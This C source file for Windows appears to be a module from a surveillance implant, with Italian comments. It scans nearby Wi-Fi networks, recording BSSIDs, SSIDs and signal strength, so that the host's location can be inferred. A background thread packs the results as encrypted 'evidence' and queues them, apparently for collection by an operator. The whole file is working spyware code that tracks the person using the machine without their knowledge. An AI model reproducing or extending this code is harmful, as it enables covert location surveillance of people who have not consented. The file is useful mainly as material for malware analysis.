#include <Windows.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "conf.h"
#include "proto.h"
#include "position.h"
#include "debug.h"


POSITION_LOGS lpPositionLogs[MAX_POSITION_QUEUE];

#define TYPE_LOCATION_WIFI 3

typedef struct _wifiloc_param_struct {
	DWORD interval;
	DWORD unused;
} wifiloc_param_struct;

typedef struct _wifiloc_additionalheader_struct {
#define WIFI_HEADER_VERSION 2010082401
	DWORD version;
	DWORD type;
	DWORD number_of_items;
} wifiloc_additionalheader_struct;

typedef struct _wifiloc_data_struct {
    UCHAR MacAddress[6];    // BSSID
	CHAR cPadd[2];
    UINT uSsidLen;          // SSID length
    UCHAR Ssid[32];         // SSID
    INT iRssi;              // Received signal 
} wifiloc_data_struct;

#include <wlanapi.h>
typedef DWORD (WINAPI *WlanOpenHandle_t) (DWORD, PVOID, PDWORD, PHANDLE);
typedef DWORD (WINAPI *WlanCloseHandle_t) (HANDLE, PVOID);
typedef DWORD (WINAPI *WlanEnumInterfaces_t) (HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST *);
typedef DWORD (WINAPI *WlanGetNetworkBssList_t) (HANDLE, const GUID *, const PDOT11_SSID, DOT11_BSS_TYPE, BOOL, PVOID, PWLAN_BSS_LIST *);
typedef DWORD (WINAPI *WlanFreeMemory_t) (PVOID);

WlanOpenHandle_t pWlanOpenHandle = NULL;
WlanCloseHandle_t pWlanCloseHandle = NULL;
WlanEnumInterfaces_t pWlanEnumInterfaces = NULL;
WlanGetNetworkBssList_t pWlanGetNetworkBssList = NULL;
WlanFreeMemory_t pWlanFreeMemory = NULL;

BOOL ResolveWLANAPISymbols()
{
	static HMODULE hwlanapi = NULL;

	if (!hwlanapi)
		hwlanapi = LoadLibrary(L"wlanapi.dll");
	if (!hwlanapi)
		return FALSE;

	if (!pWlanOpenHandle)
		pWlanOpenHandle = (WlanOpenHandle_t)GetProcAddress(hwlanapi, "WlanOpenHandle");  //FIXME: array

	if (!pWlanCloseHandle)
		pWlanCloseHandle = (WlanCloseHandle_t)GetProcAddress(hwlanapi, "WlanCloseHandle");  //FIXME: array

	if (!pWlanEnumInterfaces)
		pWlanEnumInterfaces = (WlanEnumInterfaces_t)GetProcAddress(hwlanapi, "WlanEnumInterfaces");  //FIXME: array

	if (!pWlanGetNetworkBssList)
		pWlanGetNetworkBssList = (WlanGetNetworkBssList_t)GetProcAddress(hwlanapi, "WlanGetNetworkBssList");  //FIXME: array

	if (!pWlanFreeMemory)
		pWlanFreeMemory = (WlanFreeMemory_t)GetProcAddress(hwlanapi, "WlanFreeMemory");  //FIXME: array

	if (pWlanOpenHandle && pWlanCloseHandle && pWlanEnumInterfaces && pWlanGetNetworkBssList && pWlanFreeMemory)
		return TRUE;

	return FALSE;
}

BOOL EnumWifiNetworks(wifiloc_additionalheader_struct *wifiloc_additionaheader, BYTE **body, DWORD *blen)
{
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;       
    DWORD dwCurVersion = 0;
	DWORD i, j;
	wifiloc_data_struct *wifiloc_data;
    
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	PWLAN_BSS_LIST pBssList = NULL;
	PWLAN_BSS_ENTRY pBss = NULL;

	*body = NULL;
	*blen = 0;
		
	wifiloc_additionaheader->version = WIFI_HEADER_VERSION;
	wifiloc_additionaheader->type = TYPE_LOCATION_WIFI;
	wifiloc_additionaheader->number_of_items = 0;
		
	if (!ResolveWLANAPISymbols())
		return FALSE;
    
    if (pWlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS)  
		return FALSE;
    
    if (pWlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS)  {
		pWlanCloseHandle(hClient, NULL);
		return FALSE;
    }

	// Enumera le interfacce wifi disponibili
	for (i=0; i<pIfList->dwNumberOfItems; i++) 
	{
		pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[i];

		if (pWlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid, NULL, dot11_BSS_type_infrastructure, FALSE, NULL, &pBssList) == ERROR_SUCCESS) 
		{
			// Ha trovato un interfaccia valida ed enumera le reti wifi
			// alloca l'array di strutture di ritorno
			if (!(*body = (LPBYTE)calloc(pBssList->dwNumberOfItems, sizeof(wifiloc_data_struct))))
				break;

			*blen = pBssList->dwNumberOfItems * sizeof(wifiloc_data_struct);
			wifiloc_additionaheader->number_of_items = pBssList->dwNumberOfItems;
			wifiloc_data = (wifiloc_data_struct *)*body;
			
			// Valorizza con i ssid
			PWLAN_BSS_ENTRY pBss = pBssList->wlanBssEntries;
			for (j=0; j<pBssList->dwNumberOfItems; j++) 
			{
						
				memcpy(wifiloc_data[j].MacAddress, pBss->dot11Bssid, 6);
				wifiloc_data[j].uSsidLen = pBss->dot11Ssid.uSSIDLength;
				if (wifiloc_data[j].uSsidLen>32)
					wifiloc_data[j].uSsidLen = 32; // limite massimo del SSID
				memcpy(wifiloc_data[j].Ssid, pBss->dot11Ssid.ucSSID, wifiloc_data[j].uSsidLen);
				wifiloc_data[j].iRssi = pBss->lRssi;
				
				pBss = (PWLAN_BSS_ENTRY)(((PBYTE)pBss) + 0x168); // FIXME
			}
			
			break;
		} 
	}

	if (pBssList != NULL)
		pWlanFreeMemory(pBssList);
    if (pIfList != NULL) 
        pWlanFreeMemory(pIfList);
	pWlanCloseHandle(hClient, NULL);
    
    return TRUE;
}

BOOL QueuePositionLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	for (DWORD i=0; i<MAX_POSITION_QUEUE; i++)
	{
		if (lpPositionLogs[i].dwSize == 0 || lpPositionLogs[i].lpBuffer == NULL)
		{
			lpPositionLogs[i].dwSize = dwEvSize;
			lpPositionLogs[i].lpBuffer = lpEvBuff;

			return TRUE;
		}
	}

	return FALSE;
}

VOID PositionMain()
{
	while (1)
	{
		if (bPositionThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] PositionMain exiting\n");
#endif
			hPositionThread = NULL;
			return;
		}

		if (bCollectEvidences)
		{
			DWORD dwSize;
			LPBYTE lpBody;
			wifiloc_additionalheader_struct wifi;

			EnumWifiNetworks(&wifi, &lpBody, &dwSize);

			DWORD dwEvSize;
			LPBYTE lpEvBuffer = PackEncryptEvidence(dwSize, lpBody, PM_WIFILOCATION, (LPBYTE)&wifi, sizeof(wifi), &dwEvSize);
			zfree(lpBody);

			if (!QueuePositionLog(lpEvBuffer, dwEvSize))
				zfree(lpEvBuffer);
		}

		MySleep(ConfGetRepeat(L"position"));  //FIXME: array
	}
}